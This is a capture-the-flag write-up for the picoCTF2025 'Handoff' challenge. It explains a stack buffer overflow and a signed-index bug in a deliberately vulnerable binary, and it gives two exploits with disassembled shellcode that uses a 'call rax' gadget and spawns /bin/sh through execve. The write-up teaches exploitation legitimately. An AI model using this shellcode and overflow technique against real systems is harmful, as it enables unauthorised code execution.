# Handoff @ picoCTF2025

<details>
<summary>Click me</summary>

Expandable sections are used to give additional details and examples to statements that I make along the way.
</details>

<details>
<summary>Challenge binary and source code</summary>
Compile command:
```
gcc handoff.c -o handoff -no-pie -z execstack -fno-stack-protector
```
    
binary:

</details>

<details>
<summary>Solution scripts</summary>

(TODO : can we upload files or not ?)
</details>

# The vulnerability
Looking at the code below, _line 66_, we see that we are writing up to 32 bytes into a 8 byte buffer. We can overwrite the RBP and RIP address on the stack.

![image](https://hackmd.io/_uploads/rJtecjrhJe.png)

<details>
<summary>How can you overwrite RIP and RBP on the stack ?</summary>

At the point when _line 66_ gets executed, we have the return address at address RBP+0x8, when we are writing into _feedback_ we are writing 32 bytes starting from address RBP-0xc (1st byte is written at RBP-0xc, then second byte is written at RBP-0xb, etc), it is easy to see that the 20th byte of what we are writing will start overwriting the return address on the stack.
</details>

There is also the opportunity to write a lot of data on the stack. This is because, _on line 61_ the program reads a *signed int* and uses it as an offset into the _entries_ array. This means that we could write more data than intended. 

![image](https://hackmd.io/_uploads/B1Cujorn1g.png)

<details>
<summary>How is this an issue?</summary>

If we look at the code, this is the way the offset into _entries\[\]_ is calculated:
    
![image](https://hackmd.io/_uploads/B12Hsk_3yg.png)

In RAX we have the index (as in _entries\[index\]_) and in RSI we have the address of _entries_
If you were to use a debugger and break at address 0x40139a (_"b *0x40139a"_ in gdb) you'd see that, for example, for index = 1 RAX will be 0x48 (72). 

<details>
<summary>Why those asm operations?</summary>

If you look closely, by the time the code reaches address _0x40139a_ we will have 
    
_RAX = (index * 8 + index) * 8_, which expanded is 
    
_RAX = index * 64 + index * 8_ which can be rewritten as 
    
_RAX = index * 72_ which means that you add the size of the _struct entry_ times index to index into the array.

If the size of the struct were different, the offsets would be different but the idea would still be the same, you'd add the size of the struct times the index.
</details>
    
This makes sense because the layout of the struct is like this:

![image](https://hackmd.io/_uploads/S1Mm6ydnyg.png)
    
It is easy to see that to get the address of _entries\[1\]_, you'd have to add 72 to the address of _entries\[0\]_

Ok, now what happens when we say that we want to write at _entries\[-1\]_ ?

If we use a debugger to break at the address _0x40139a_ and we follow that path in the code, when asked _"Which recipient would you like to send a message to?"_ we say "-1" and this is what we get:
    
![image](https://hackmd.io/_uploads/HyFi1xOnJe.png)

if we then single step, we see that in RAX we have _0x7fffffffdee8_, in theory we shouldn't be able to write below the _entries\[0\]_ address, which is _0x7fffffffdf30_, yet here we are.

-1 is represented (as a 4 byte signed int) as 0xffffffff, it goes down to 0x80000000 which is -2147483648.
All of this being said we can write below _entries\[0\]_ because the addition overflows once, we could make it overflow a second time and write above the end of _entries\[10\]_ yet when I did the math I found out that you cannot overwrite the return address on the stack and ultimately trying to exploit this vulnerability is harder than the exploit that we chose.

</details>

There are three problems with this vulnerability: 
1) Any function call will clobber data written below (at a lower address) the _entries\[\]_ boundary
2) We cannot write continuous data because we cannot write at _entries\[-1\].name_ for example
3) I don't think that you can overwrite the return address on the stack.

# The exploit

We are talking about exploiting the vulnerability at _line 66_ in both cases.

# First exploit

(TODO : can we upload files or not ?)

This is a simpler exploit, we start by placing the shellcode on the stack by writing a message in _entries\[0\]_. For now it is not important what the shellcode means.

Then we select option 3 to exit and get prompted for a feedback, that is when we supply the second shellcode payload.
The second payload is:
```=
0:  90                      nop
1:  48 81 ec e0 02 00 00    sub    rsp,0x2e0
8:  48 89 e0                mov    rax,rsp
b:  ff d0                   call   rax
```
It is important to observe that in the target binary, at address _0x4013ed_, it is writing 0 at offset 7 into our payload. We have to just deal with that. The first NOP in the payload is doing exactly that, making it so that the _feedback[7] = '\0';_ line does not impact our payload. That is because, in our presented payload, the 7th byte is 0 anyways.

The second important observation is that the fgets function has a return value, which is the actual address of the buffer in which it has written. In our case it is exactly the second payload. That means that if there were a "call rax" gadget in the binary, we could just jump to the second payload. Such a gadget exists at address _0x401014_

When we start executing code, we are placing into RAX the address of the first shellcode payload and just jumping to it.
The first shellcode is:
```=
0:  31 c0                   xor    eax,eax
2:  48 bb d1 9d 96 91 d0    movabs rbx,0xff978cd091969dd1
9:  8c 97 ff
c:  48 f7 db                neg    rbx
f:  53                      push   rbx
10: 54                      push   rsp
11: 5f                      pop    rdi
12: 99                      cdq
13: 52                      push   rdx
14: 57                      push   rdi
15: 54                      push   rsp
16: 5e                      pop    rsi
17: b0 3b                   mov    al,0x3b
19: 0f 05                   syscall 
```
What this does is call the execve syscall with "/bin/sh" as an argument. First it constructs the string "/bin/sh" in the register RBX, it then pushes it onto the stack, places into RDI a pointer to the string "/bin/sh" previously pushed onto the stack. Places into RSI a pointer to a pointer to the string "/bin/sh" (it makes _argv\[0\]_ = "/bin/sh"). The _cdq_ instruction at offset 12 sign extends RAX into RDX, since RAX is 0 then it effectively zeroes RDX, this is useful because RDX would be a pointer to _envp_ and we don't care about that.

Once the first payload executes we have a shell and we can read the flag.

# Second exploit

(TODO : can we upload files or not ?)

This exploit is similar to the first one but stands out because it exclusively relies on the vulnerable write operation into the feedback buffer. Unlike the first exploit, it doesn't require any additional methods within the binary to write to the stack.

It goes like this:
We immediately exit the program which will prompt us to write a feedback, we supply this payload:
```=
0:  90                      nop
1:  90                      nop
2:  90                      nop
3:  90                      nop
4:  48 96                   xchg   rsi,rax
6:  00 00                   add    BYTE PTR [rax],al
8:  48 31 c0                xor    rax,rax
b:  48 31 ff                xor    rdi,rdi
e:  0f 05                   syscall 
```
The NOPs at the start serve to align the payload. We want to be able to absorb that _feedback\[7\] = '\0';_ operation that we talked about earlier, and as you can see, the 7th byte of the payload is 0. The purpose of _add    BYTE PTR \[rax\],al_ is to just have a 7th 0 byte and to not mess up the state of the program. Doing _add    BYTE PTR \[rax\],al_ is fine because in RAX we have a valid address, our buffer, and changing the first byte of the payload does nothing because by the time the _add_ is executed, we already executed the first NOP.

We then do the read syscall to write AGAIN inside of the _feedback_ buffer. When we do the syscall, the execution will continue at the address coming after the syscall instruction. Knowing this we append some NOPs to the shellcode that we will send to the read syscall.

Finally, we send the same shellcode as before (but with the NOPs prepended as we talked about above), the one that does the syscall _execve("/bin/sh", \["/bin/sh"\], NULL);_. 

This spawns a shell for us on the target system and the flag can be read.